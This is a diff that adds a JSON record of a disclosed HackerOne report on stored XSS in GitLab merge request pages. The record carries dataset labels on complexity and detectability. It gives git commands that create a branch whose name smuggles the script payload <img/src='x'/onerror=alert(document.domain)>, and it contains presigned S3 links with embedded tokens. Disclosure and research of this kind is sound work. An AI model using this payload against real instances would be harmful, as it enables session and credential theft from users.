@@ -1,0 +1,60 @@
+{
+  "reported_to": "GitLab",
+  "reported_by": "mike12 ",
+  "title": "Stored XSS in merge request pages",
+  "content": "\nHello Gitlab!\nVulnerable code\nTo reproduce the bug, we need to open a merge request with the following conditions:\nProject must have 'Merge commit with semi-linear history' or 'Fast-forward merge' merge method\nThe merge request must require rebase before fast-forward/merge\nA visitor of the merge request page must not have permissions to push to source branch\nTarget branch name must have a special name <img/src='x'/onerror=alert(document.domain)> :)\nSteps to reproduce:\nRun Gitlab docker run --detach --hostname gitlab.example.com --publish 443:443 --publish 80:80 --publish 22:22 --name gitlab gitlab/gitlab-ce:latest\nCreate a new project\n<image_0>\ntouch 1.txt\ngit add 1.txt\ngit commit -m \"initial commit\"\ngit push origin master\ngit checkout -b \"<img/src='x'/onerror=alert(document.domain)>\"\ntouch 2.txt\ngit add 2.txt\ngit commit -m \"add 2.txt\"\ngit push origin \"<img/src='x'/onerror=alert(document.domain)>\"\ngit checkout master\ntouch 3.txt\ngit add 3.txt\ngit commit -m \"add 3.txt\"\ngit push origin master\nCreate a merge request master => <img/src='x'/onerror=alert(document.domain)>\nThen we have to visit the merge request page under a user who does not have permissions to push to the source branch (in our case, master branch). For example:\nMake the project public and visit the merge request page under any user who does not have permissions in the project (or without authorization)\nInvite a user to the project, but without permissions to push to the source branch.\n<image_1>\nCode 868 Bytes\n1root@gitlab:/# gitlab-rake gitlab:env:info\n2\n3System information\n4System:\t\t\n5Current User:\tgit\n6Using RVM:\tno\n7Ruby Version:\t2.6.3p62\n8Gem Version:\t2.7.9\n9Bundler Version:1.17.3\n10Rake Version:\t12.3.3\n11Redis Version:\t3.2.12\n12Git Version:\t2.22.0\n13Sidekiq Version:5.2.7\n14Go Version:\tunknown\n15\n16GitLab information\n17Version:\t12.4.0\n18Revision:\t1425a56c75b\n19Directory:\t/opt/gitlab/embedded/service/gitlab-rails\n20DB Adapter:\tPostgreSQL\n21DB Version:\t10.9\n22URL:\t\thttp://gitlab.example.com\n23HTTP Clone URL:\thttp://gitlab.example.com/some-group/some-project.git\n24SSH Clone URL:\tgit@gitlab.example.com:some-group/some-project.git\n25Using LDAP:\tno\n26Using Omniauth:\tyes\n27Omniauth Providers: \n28\n29GitLab Shell\n30Version:\t10.2.0\n31Repository storage paths:\n32- default: \t/var/opt/gitlab/git-data/repositories\n33GitLab Shell path:\t\t/opt/gitlab/embedded/service/gitlab-shell\n34Git:\t\t/opt/gitlab/embedded/bin/git\n35root@gitlab:/# \nImpact\nAn attacker can:\nPerform any action within the application that a user can perform\nSteal sensitive user data\nSteal user's credentials\n\n",
+  "severity": [
+    7.0,
+    8.9
+  ],
+  "bounty": 3500,
+  "weaknesses": [
+    "Cross-site Scripting (XSS) - Stored"
+  ],
+  "screenshots": {
+    "image_0": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/p5PL8rytMqZmgeffH4dBB3DL?response-content-disposition=attachment%3B%20filename%3D%22project-settings.png%22%3B%20filename%2A%3DUTF-8%27%27project-settings.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQ6GJRGFQU%2F20250324%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20250324T235712Z&X-Amz-Expires=833&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJr%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIBkFfXk5sITO6%2Fy53%2Fb6WKOz6AADhYeKHVlyIB%2BCc8t3AiEAs9W%2B62UgoolWPI%2F58bjjXfWVOeOcBzqiG50JhDeMCLEquwUI8%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FARADGgwwMTM2MTkyNzQ4NDkiDHzSwLBlIE2mvyYXfCqPBYpfUX1deuQRunTbSH3WqJGOXemIug0Q6WYsk1ItL0tXeKHJOXctqGuAMgqo7%2FlOQCNlnTYHEBhjSQCQxBkQ%2Bwgo6AGifbrWj4cXDMVjoEmryTiPgHxWru3zHVDwzcILfbMST5hTDAjgHzDyIDtSluoHA4TGxwmPC3HIFoy6gixWSzXM75lgRz982tXXhe7nRdCs7NtOTYkIgk0v0OUPVZxhNmBYgDXArCV0XYpI%2F9a%2BvupkBOn3Zw412Y89oMOFoflxnieBVazArJ%2BOyLp7AKxek9PSG2udM%2BFXiQYRENplxUto8reDCA0SmMAuWH%2FdA2t6x8leB7S%2FpInBHv6LO0k1s2jKX06RHtCEYIP01ywZkcPbFywwl8aeBjqqgF9KjE79DLeTA5HlV2FJbaOqv0%2BHipcPeoJFgeK4l1bvoDy6Vb4L%2Fyf50kaCcHCPQkYsommPeNcTv0lLMuU543U3UCSCTGfVdZzrN8Y%2Fbz9sa5FRDUWovKggIqm4B5nMrTcc%2FWoedCpKbuTf3Bp1bEgipZdQIhaaec8Yg2BibgaHvtYkmwNBPI6P8rlvSapLhGD29BVCElk3b79SbOPEeE%2Bh%2BPZ8hIBTTCu5RsiP%2BurKW1XXcnN7KwZoURlLQ4NLbu1oeTuH4aSNlHAtXJ9oUK0fYvvLAsC8rA2akJAxcn18KXR1W6Rr%2BrDhrCadrfmCwC5Nv0Xl5ryWMicYH5Dj4B69SNmqlSu6cI0qs2FAbS5n%2FBtziYQ7fW2ziGq77bzltZSFg9YfsIIh3Y7D6yhqBuKkAC0lLZoKQgStO9QdEgmeHYKTWxjQWTr3l1a9UZZ6H9sjf3DLBtboYYpb2FnzGi3TwmrrVNA4iVPcf0CuXt5iRgwws7eGvwY6sQFDfIW4fKJgjkbXkypmYF1y%2FRQxHmTkpA0XNQbzleO8gpv%2BmeQ4X9Q11PJEQDcAsz2y5PtpcHIULqQaol8OPwZX88gI08H1lkMXmpasthWO7Pq3Yw6nWgv5lJYBXitiJuaJLYKZ3XtrLWn5uTI9TzydoTNFfRgfBW32vcS110WPMMdVNE9JUNBaRe83IBZd%2BeHusGc6d%2B4FKFCXJ82W2F7PHfXihV0otC%2FdyDcv97RSB44%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=da0536abdf0fd1ec01f845ca5b5db72519f677d28bac288d909aa47fc13c6019",
+    "image_1": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/MwecQWbQ5p6VA8za2yBauYeg?response-content-disposition=attachment%3B%20filename%3D%22example1.png%22%3B%20filename%2A%3DUTF-8%27%27example1.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQ6GJRGFQU%2F20250324%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20250324T235712Z&X-Amz-Expires=833&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJr%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIBkFfXk5sITO6%2Fy53%2Fb6WKOz6AADhYeKHVlyIB%2BCc8t3AiEAs9W%2B62UgoolWPI%2F58bjjXfWVOeOcBzqiG50JhDeMCLEquwUI8%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FARADGgwwMTM2MTkyNzQ4NDkiDHzSwLBlIE2mvyYXfCqPBYpfUX1deuQRunTbSH3WqJGOXemIug0Q6WYsk1ItL0tXeKHJOXctqGuAMgqo7%2FlOQCNlnTYHEBhjSQCQxBkQ%2Bwgo6AGifbrWj4cXDMVjoEmryTiPgHxWru3zHVDwzcILfbMST5hTDAjgHzDyIDtSluoHA4TGxwmPC3HIFoy6gixWSzXM75lgRz982tXXhe7nRdCs7NtOTYkIgk0v0OUPVZxhNmBYgDXArCV0XYpI%2F9a%2BvupkBOn3Zw412Y89oMOFoflxnieBVazArJ%2BOyLp7AKxek9PSG2udM%2BFXiQYRENplxUto8reDCA0SmMAuWH%2FdA2t6x8leB7S%2FpInBHv6LO0k1s2jKX06RHtCEYIP01ywZkcPbFywwl8aeBjqqgF9KjE79DLeTA5HlV2FJbaOqv0%2BHipcPeoJFgeK4l1bvoDy6Vb4L%2Fyf50kaCcHCPQkYsommPeNcTv0lLMuU543U3UCSCTGfVdZzrN8Y%2Fbz9sa5FRDUWovKggIqm4B5nMrTcc%2FWoedCpKbuTf3Bp1bEgipZdQIhaaec8Yg2BibgaHvtYkmwNBPI6P8rlvSapLhGD29BVCElk3b79SbOPEeE%2Bh%2BPZ8hIBTTCu5RsiP%2BurKW1XXcnN7KwZoURlLQ4NLbu1oeTuH4aSNlHAtXJ9oUK0fYvvLAsC8rA2akJAxcn18KXR1W6Rr%2BrDhrCadrfmCwC5Nv0Xl5ryWMicYH5Dj4B69SNmqlSu6cI0qs2FAbS5n%2FBtziYQ7fW2ziGq77bzltZSFg9YfsIIh3Y7D6yhqBuKkAC0lLZoKQgStO9QdEgmeHYKTWxjQWTr3l1a9UZZ6H9sjf3DLBtboYYpb2FnzGi3TwmrrVNA4iVPcf0CuXt5iRgwws7eGvwY6sQFDfIW4fKJgjkbXkypmYF1y%2FRQxHmTkpA0XNQbzleO8gpv%2BmeQ4X9Q11PJEQDcAsz2y5PtpcHIULqQaol8OPwZX88gI08H1lkMXmpasthWO7Pq3Yw6nWgv5lJYBXitiJuaJLYKZ3XtrLWn5uTI9TzydoTNFfRgfBW32vcS110WPMMdVNE9JUNBaRe83IBZd%2BeHusGc6d%2B4FKFCXJ82W2F7PHfXihV0otC%2FdyDcv97RSB44%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=595ec576bac3cc23f73f6b5a2d294f5cf23651b5a99d0d22c3385d9c88efef48"
+  },
+  "disclosed_date": 1685444100,
+  "report_url": "https://hackerone.com/reports/723307",
+  "is_multi_component": true,
+  "complexity": "MEDIUM",
+  "novelty": "MEDIUM",
+  "vuln_category": "WEB_APP",
+  "steps": [
+    [
+      1,
+      "Run Gitlab docker container"
+    ],
+    [
+      2,
+      "Create a new project and perform initial commits"
+    ],
+    [
+      3,
+      "Create a branch with a malicious name containing XSS payload"
+    ],
+    [
+      4,
+      "Create a merge request from master to the malicious branch"
+    ],
+    [
+      5,
+      "Visit the merge request page as a user without push permissions"
+    ]
+  ],
+  "vuln_description": "Stored XSS vulnerability in merge request pages where a specially crafted branch name containing an XSS payload is rendered unsanitized when certain merge conditions are met and viewed by a user without push permissions.",
+  "reason": "The vulnerability requires specific conditions to be met (merge method settings, rebase requirement, permission constraints) and involves a non-obvious interaction between branch naming and merge request page rendering. However, the XSS vector itself is straightforward once these conditions are understood.",
+  "new_complexity": "MEDIUM",
+  "requires_code": false,
+  "requires_CVE": false,
+  "is_ctf": false,
+  "other_report": null,
+  "injection_metadata": {
+    "is_simple_payload": true
+  },
+  "authnz_metadata": {
+    "reason": "The vulnerability involves a stored XSS in merge request pages where the target branch name contains malicious HTML. The methodology described focuses on authentication and authorization bypasses (AuthN/AuthZ) and IDOR vulnerabilities by swapping user sessions and resource IDs. However, the XSS vulnerability does not involve bypassing authentication or authorization boundaries but rather exploits improper input sanitization in the display of branch names. Therefore, the described methodology would not detect this vulnerability as it does not fit the patterns of AuthN/AuthZ bypass or IDOR.",
+    "is_detectable": false
+  }
+}
